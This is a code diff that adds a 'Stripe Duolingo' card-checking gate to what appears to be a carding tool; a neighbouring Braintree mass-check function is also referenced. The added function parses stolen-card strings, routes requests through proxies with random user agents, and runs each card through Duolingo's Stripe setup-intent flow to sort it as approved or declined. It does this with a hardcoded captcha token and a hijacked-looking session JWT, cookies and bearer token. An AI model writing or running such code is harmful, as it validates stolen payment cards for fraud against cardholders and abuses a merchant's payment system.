@@ -705,6 +705,155 @@ def check_braintree_mass(cc, proxy=None):
                 return f"Error: {str(e)}", "ERROR"
     return "Max retries exceeded", "ERROR"
 
-            
+
+# ============================================================================
+# 🚪 GATE 5: Stripe Duolingo Auth (from your script)
+# ============================================================================
+def check_duolingo_stripe(cc, proxy=None):
+    """
+    Stripe gate using Duolingo (setup intent) – hardcoded user session.
+    Returns (response_text, status)
+    """
+    try:
+        # Parse card
+        cc = cc.strip()
+        parts = cc.split('|')
+        if len(parts) < 4:
+            return "Invalid card format", "ERROR"
+        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
+        if len(yy) == 4:
+            yy = yy[2:]  # use last two digits
+
+        session = requests.Session()
+        if proxy:
+            formatted = format_proxy(proxy)
+            if formatted:
+                session.proxies = formatted
+
+        ua = get_random_ua()
+        session.headers.update({'User-Agent': ua})
+
+        # ----- Step 1: Create Stripe payment method (with hcaptcha token) -----
+        pk = "pk_live_wGV2ziRFq7KJLNaVUAJgrzDf"
+        headers1 = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': ua,
+        }
+        data1 = (
+            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
+            f'&allow_redisplay=unspecified&billing_details[address][country]=EG'
+            f'&payment_user_agent=stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+payment-element%3B+deferred-intent'
+            f'&referrer=https%3A%2F%2Fwww.duolingo.com&time_on_page=64702'
+            f'&client_attribution_metadata[client_session_id]=e129985f-0f6a-4370-9a74-df8f5ccc7c93'
+            f'&client_attribution_metadata[merchant_integration_source]=elements'
+            f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
+            f'&client_attribution_metadata[merchant_integration_version]=2021'
+            f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
+            f'&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
+            f'&client_attribution_metadata[elements_session_config_id]=c1a2f63e-3635-40a5-9e9b-56756df7ffb4'
+            f'&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
+            f'&guid=988025ef-d737-4366-89b4-b2136b00ee9a&muid=6950a86d-c053-4040-964d-70b05e5d42dd'
+            f'&sid=d6f2fa65-23f3-4309-a687-6fd362af6910&key={pk}'
+            f'&_stripe_version=2025-03-31.basil'
+            f'&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzMjk3OTA3LCJjZGF0YSI6ImhOZ3YrdFduZEoxN0ZJYi8yWVJQdGpNUHFxSzRJM1FZNGVJSmprT1NlLzVXdEJ6OHdDZFNNQVBOcUlpcWRDOXYxaUJ4TmszR0xsRzZtaTJ5TU5NSEdWMmtUVzR2YUhoRVF0YlhFQStmenVFakkzQWxBVXVOa0JUL2w2M2FnbE9Ic0RmclRTWE1VMlZlVllKUERxQm5jQjJvRDRFd1hhYUV0b1pSdCs0LzFsTVZqTENwSXlTK2tZdnBkQ1FCWVF5SVVUcWNuRUdHb1BiQXBjNkkiLCJwYXNza2V5IjoiNHJrWko0clQrUU5zelRFN3lES0VxM3JzTVBYRmpGaXVUamhPS0tVNGdhc3VPbkp2QWUvbmpnTVpEblRRdDhQM25LWXlNcThxMENBWXhXa01KbWNQak80WkdlWHRzb1lQWkhJT0RQYUxGb3psT3V5OVlINEluejBYbDhwY3NabjJTbUFJL24vbFpQNEtSc2o0MCt6Nzk5OXo3aERRS0MwZ2lXUjZHRXBaT1NFaUdMTE94VGRNdm9CWmRiNGpYTXozbU5RNUNkZ1czN2g0U0ZweWllZHZjTFlxd09tTjh0YnZTakwrMEE2YktPVGxNSG50Q1AyTzNRR2RTelNpSWtORUpNeTBmSjdpUFZFM2syTFlIOGxSNW8vL3NsT3dwNlVPYXNvZklqYk1GMHo3dGlkWExQaC9wdzdod3FiOXVGZEwwSUZ4bGdWcmtnR1doY0tLb0FuQmR5VjBJNDhOSEJvK2U5VTVDSnlpY3ltV1VBVDl5NGs3VjF2L3VLZ2pHN09jWjJpNVpBTURPS0FucGJ3RGtLTTJobnltNHJyanBROHRPdVIzb2szaW8za2ZuSDk2TDVaWlV4OHZBRUhPcTZRbUpJYzJLZDJhb1pnazRQOHVrMVRCVVhxaE01VmJGTnYxNDhWTHFzcnJaM0lod1RHeG5ESElJdTd6U1JUVVVFMHVSdlJRVnY4WFIrMnVvWUNoVVhJZzFIMlZ0Nk90UGxhRzdzVkNmTGJ4dXlPMU1EaS9WcFEvN0ltaEdTNmh5SlJuS3NXZE5CNDh1MWNOZk1DTzdNMUJiQk1UdHpxdmFQY0dCWTRXQnZZbjlqenZhSjlCNmdwaEYvRmY2WENNWjRKdWZVdVAvWVFrQlhlL0ZaQXUycVBjZ3dPK1pMS1NVRWJuUWRUaHQ0cStlaU5WeXNsOEx1UVliZGFjNW9BTS9ndFloQVZVRFc0cnJXTnVwL2Y2OHJCdFBNaWJTeUhOWWFWYmJpR1JpQXdLYjNWWW9TWVloMG9Obkxxb0ZFVzl2MklOMDFVV2hhR2NoSHhvVis0NzgzMmpNS3YyRnlnZjVaMVJIMmJ1cCs0anZJTCtnbjVkSWswUys3RlRDekIybTFudWZCYmp1THNpbVJZeW5CYXU3U01ZTDZMU3JTbVJ4MWx0SEpCUGZGb0xpREVVc1c2ckpxbDNPZlovY295M1dyNlp5S3VsbXQ0S0ZsUjFkZlpOd1VockRyY3lxMGVLcnJHWE9IaDdXYjNBR0FJZTFIL1dzQk44MXFldjNpMVltT3U1dTlmamRqVjl1TTFJYzdqbHdhUFNpem1telp6b3FEQ0FNdFpyY2RXWUgrOG1LWHBRSHBsck0ya005NWtGVHlXTGZlNHhzZmdJVlYyQU5Zenp2WnRJS2NlbmpVUE5KTml1LzFpaEgzRWM1eHJ5ajhkcmpHSkdHUGd1UlNUMnhIYlR0TE9ZYVQxS29yTG9sWmJFUmJnWXdZQXVRYWhOamVnK3poY2gyZ3FsdGZmUXlKVGY5YUZKaXZLMnE2WkxRUUlRbmNoOURmRHZJM1lqTWZVcjBEcUVHN1prZ0s5S3FpS3VCUnpRZFRLVDlJUXUwRlM0VFI4M0FBN0x5ak11ZS8zVkNHbHdtWXIrSGRMTXdzYzVuM0NocWRlWVJGRkhqaHBoK291UjRhZk11V0xMRE02Ti9ZRW9YNnl1a2NWOUZjNUFSVjlVWUVWRTE3MkZwWW1MZ2xmUlBRbmUvR3FGN1lhRm9rbUIwK0ZhTTF5NnRCeXJLK0ZqczlKcFV2VHExVmhVWmFCMUNwaE52WmsxWDgydkwrRUozNTZPTDN4RmZKQStNeEIzN1pGdFY2ak93Qlh2L3ZvSXR5TW5rVGlDNTlOcWNFRTJueFNLVldwOFYxQ3diZ0cwMlJCNGtYV09QOThjUElzK3V5ZUJYdVlhNnRjNlU0L1dpMVcxQTdNeTJMbjFUZWowamlyTy9vMDFPbitpS2U4SFd5R0RSNzRpTGo2RzFubmFmdDNBaTdKdHB2bkRLZFdIQllZcDhEbEFGdUI0ZHlDRi9nYndkZEMwa2JXU3I4L2xINCtPRDVMZm9rc1VFaFNRcmo2MFpXSG9BMU1kQVhrWVkyWFpkMFcwV0lFWjVYOWQvekNIQlBUUDdRUjRKZUVFazF6cG5SZ1JUYU1GZ0tYcnZoR2l0c0lpTWZwUVJOcEd0dzZLYzB4cExnVUszVTBIQW81RVArZzRsVFJNcGkxb0tiZDkwdWk2MW84cmMvdjJCaEd5anBkaTFOcjRyODhmVjdFNHJCelFWRzNGZkdrSTBQdXJYOS9MTDFDNWJVUVlacHBzcERscXhJYkl6amFIVW5obHRNbFFtdzFJeDlpbzJ6VHFvd2V6akU2NjVLUS9yLytqc2xCUFZ0aDZFeGN3WjNlejNMS1FKSHJYTitpT2RZck5hblpIY2J0TG9uOTNpYlQzdndRY2ZDUDV3VGM5a1YvNzl4eVc3eHg5RW5ObmY1bEEyTmc2SHAwQSt1WHJIakx3YlB4L1A3QjBtQTBCaTBQZGp1dXRYcEVSSXRDS29lL1BHS2lRbVRhWnVVM0Y2WW1aVHU0UEFYbUFuRU4yZW9vNEhYMXV6d0NqQ3I4b3FCUi96czIyV0JSU0Jzdm0iLCJrciI6IjM3YTZlMzllIiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.pe2FvPXTpYyfAGvDVeC2npyYFsn11R8Y4cDGrhgKvF0'
+        )
+        r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=20)
+        if r1.status_code != 200:
+            return f"PM creation failed ({r1.status_code})", "ERROR"
+        pm_id = r1.json().get('id')
+        if not pm_id:
+            return "No payment method ID", "ERROR"
+
+        # ----- Step 2: Get clientSecret from Duolingo (hardcoded user) -----
+        cookies = {
+            'lang': 'en',
+            'wuuid': '8624f750-bbef-43da-91b5-a943fdc1a601',
+            'tsl': '1763297684607',
+            'lu': 'https://www.duolingo.com/super',
+            'initial_referrer': 'https://www.google.com/',
+            'lp': 'plus',
+            'OptanonConsent': 'isGpcEnabled=0&datestamp=Sun+Nov+16+2025+14%3A54%3A46+GMT%2B0200+(Eastern+European+Standard+Time)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=6e3d7b1a-0d4a-431b-8d0c-176bc858a50b&interactionCount=0&isAnonUser=1&landingPath=https%3A%2F%2Fwww.duolingo.com%2Fsuper&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1',
+            '_fbp': 'fb.1.1763297686416.509921109532813659',
+            '_ga': 'GA1.2.1452051304.1763297687',
+            '_gid': 'GA1.2.1789913202.1763297687',
+            '_gcl_au': '1.1.1385406225.1763297687',
+            'g_state': '{"i_l":0,"i_ll":1763297688316,"i_b":"sKyv/YduO9ml0dH1cMCc0yTWIy2Z8FE13WxrxUMCXeo"}',
+            'lr': '',
+            'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjo1OTc0NDk4NDExNTU0ODF9.O-Bdtg-0re6VnKigrm13jXf50MGvUg3i5v3j35JmrdU',
+            'csrf_token': 'IjIxMDUzYTFkYzMxZjQ5NzRiNTQwOGZkMjNlMTU2NmEwIg==',
+            'logged_out_uuid': '597449841155481',
+            'logged_in': 'true',
+            'AWSALB': 'jvTtfKLDSx1R0rlhxUEiskw4qhq4q+FN6ypP50TeBL4d5nGN8y9CN+vwmaDUqwjFtV7Wye2fq2yIRRYac3Frziizl3sKBfscYgMrKdwbXT4LGAoSX/kzCsZtO+K3',
+            'AWSALBCORS': 'jvTtfKLDSx1R0rlhxUEiskw4qhq4q+FN6ypP50TeBL4d5nGN8y9CN+vwmaDUqwjFtV7Wye2fq2yIRRYac3Frziizl3sKBfscYgMrKdwbXT4LGAoSX/kzCsZtO+K3',
+            '_ga_CSFDVCPQ4F': 'GS2.1.s1763297686$o1$g1$t1763297720$j26$l0$h0',
+        }
+        headers2 = {
+            'authority': 'www.duolingo.com',
+            'accept': 'application/json; charset=UTF-8',
+            'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjo1OTc0NDk4NDExNTU0ODF9.O-Bdtg-0re6VnKigrm13jXf50MGvUg3i5v3j35JmrdU',
+            'content-type': 'application/json; charset=UTF-8',
+            'idempotency-key': pm_id,
+            'origin': 'https://www.duolingo.com',
+            'referer': 'https://www.duolingo.com/super',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': ua,
+            'x-amzn-trace-id': 'User=597449841155481',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        json_data = {'paymentMethodId': pm_id, 'product': 'DUOLINGO'}
+        r2 = session.post(
+            'https://www.duolingo.com/2023-05-23/users/597449841155481/create-setup',
+            cookies=cookies, headers=headers2, json=json_data, timeout=20
+        )
+        if r2.status_code != 200:
+            return f"Duolingo setup failed ({r2.status_code})", "ERROR"
+        clientSecret = r2.json().get('clientSecret')
+        if not clientSecret:
+            return "No clientSecret", "ERROR"
+
+        # ----- Step 3: Confirm the setup intent with Stripe -----
+        headers3 = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': ua,
+        }
+        data3 = {
+            'return_url': 'https://www.duolingo.com/shop',
+            'payment_method': pm_id,
+            'expected_payment_method_type': 'card',
+            'use_stripe_sdk': 'true',
+            'key': pk,
+            'client_secret': clientSecret,
+        }
+        ids = clientSecret.split('_secret_')[0]
+        r3 = session.post(f'https://api.stripe.com/v1/setup_intents/{ids}/confirm', headers=headers3, data=data3, timeout=20)
+        if r3.status_code != 200:
+            return f"Confirmation failed ({r3.status_code})", "ERROR"
+        response_text = r3.text
+        if 'succeeded' in response_text.lower():
+            return "Approved ✅", "APPROVED"
+        else:
+            return "Declined", "DECLINED"
+
+    except Exception as e:
+        return f"Error: {str(e)}", "ERROR"
 
            
